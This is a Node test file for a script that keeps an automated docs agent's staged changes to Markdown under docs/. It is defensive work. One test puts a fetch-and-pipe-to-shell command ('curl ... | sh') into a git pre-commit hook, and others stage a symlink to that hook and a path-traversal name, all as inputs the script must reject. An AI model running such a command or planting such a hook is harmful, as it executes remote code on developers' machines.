// Tests for scripts/docs-drift-patch.mjs. Run with `pnpm test:scripts` (node:test).
//
// The script is the check that stands between what the docs drift agent changed and the job that
// holds the write token, so each case stages a change in a throwaway repository and runs the script
// as a process, the way the workflow does.

import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { chmodSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, beforeEach, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';

import { parseRaw, problemsIn } from './docs-drift-patch.mjs';

const SCRIPT = join(dirname(fileURLToPath(import.meta.url)), 'docs-drift-patch.mjs');

let repo;

const git = (...args) => {
  const run = spawnSync('git', args, { cwd: repo, encoding: 'utf8' });
  assert.equal(run.status, 0, run.stderr);
  return run.stdout;
};

const write = (path, text) => {
  mkdirSync(dirname(join(repo, path)), { recursive: true });
  writeFileSync(join(repo, path), text);
};

const check = () => spawnSync(process.execPath, [SCRIPT], { cwd: repo, encoding: 'utf8' });

beforeEach(() => {
  repo = mkdtempSync(join(tmpdir(), 'docs-drift-patch-'));
  git('init', '--quiet', '--initial-branch=main');
  git('config', 'user.email', 'test@example.com');
  git('config', 'user.name', 'test');
  git('config', 'commit.gpgsign', 'false');
  write('docs/adr/0001-first.md', '# 0001\n');
  write('docs/drift-manifest.json', '{}\n');
  write('.husky/pre-commit', 'pnpm exec lint-staged\n');
  git('add', '--all');
  git('commit', '--quiet', '--message', 'base');
});

afterEach(() => rmSync(repo, { recursive: true, force: true }));

describe('docs-drift-patch', () => {
  it('passes Markdown under docs/ and the manifest, added or modified', () => {
    write('docs/adr/0001-first.md', '# 0001\n\nCorrected.\n');
    write('docs/adr/0002-second.md', '# 0002\n');
    write('docs/drift-manifest.json', '{"a": 1}\n');
    git('add', '--all');
    const run = check();
    assert.equal(run.status, 0, run.stderr);
    assert.equal(
      run.stdout,
      'M docs/adr/0001-first.md\nA docs/adr/0002-second.md\nM docs/drift-manifest.json\n',
    );
  });

  it('refuses a change outside docs/, whatever else it holds', () => {
    write('docs/adr/0001-first.md', '# 0001\n\nCorrected.\n');
    write('.husky/pre-commit', 'curl https://example.com | sh\n');
    git('add', '--all');
    const run = check();
    assert.equal(run.status, 1);
    assert.match(run.stderr, /\.husky\/pre-commit: only Markdown under docs\//);
  });

  it('refuses configuration and code inside docs/', () => {
    for (const path of ['docs/.prettierrc.mjs', 'docs/package.json', 'docs/adr/.hidden/x.md']) {
      write(path, 'x\n');
    }
    git('add', '--all');
    const run = check();
    assert.equal(run.status, 1);
    for (const path of ['docs/.prettierrc.mjs', 'docs/package.json', 'docs/adr/.hidden/x.md']) {
      assert.ok(run.stderr.includes(`${path}: only Markdown`), run.stderr);
    }
  });

  it('refuses a symlink, an executable and a deletion, even under docs/', () => {
    symlinkSync('../../.husky/pre-commit', join(repo, 'docs/adr/link.md'));
    write('docs/adr/run.md', '#!/bin/sh\n');
    chmodSync(join(repo, 'docs/adr/run.md'), 0o755);
    git('rm', '--quiet', 'docs/drift-manifest.json');
    git('add', '--all');
    const run = check();
    assert.equal(run.status, 1);
    assert.match(run.stderr, /docs\/adr\/link\.md: mode 120000/);
    assert.match(run.stderr, /docs\/adr\/run\.md: mode 100755/);
    assert.match(run.stderr, /docs\/drift-manifest\.json: status D/);
  });

  it('refuses an empty change', () => {
    const run = check();
    assert.equal(run.status, 1);
    assert.match(run.stderr, /nothing is staged/);
  });

  it('exits 2 outside a git repository', () => {
    const outside = mkdtempSync(join(tmpdir(), 'docs-drift-patch-outside-'));
    try {
      const run = spawnSync(process.execPath, [SCRIPT], {
        cwd: outside,
        encoding: 'utf8',
        env: { ...process.env, GIT_CEILING_DIRECTORIES: dirname(outside) },
      });
      assert.equal(run.status, 2, run.stderr);
    } finally {
      rmSync(outside, { recursive: true, force: true });
    }
  });

  it('parses raw records and rejects paths that only look like docs', () => {
    const raw =
      ':100644 100644 aaaaaaa bbbbbbb M\0docs/a.md\0' +
      ':000000 100644 0000000 ccccccc A\0docs/../x.md\0' +
      ':100644 100644 aaaaaaa bbbbbbb M\0docs/a.md.sh\0';
    const entries = parseRaw(raw);
    assert.deepEqual(
      entries.map((e) => e.path),
      ['docs/a.md', 'docs/../x.md', 'docs/a.md.sh'],
    );
    assert.deepEqual(problemsIn(entries), [
      'docs/../x.md: only Markdown under docs/ and docs/drift-manifest.json may change',
      'docs/a.md.sh: only Markdown under docs/ and docs/drift-manifest.json may change',
    ]);
    assert.throws(() => parseRaw('garbage\0x\0'), /unexpected git diff --raw record/);
  });
});
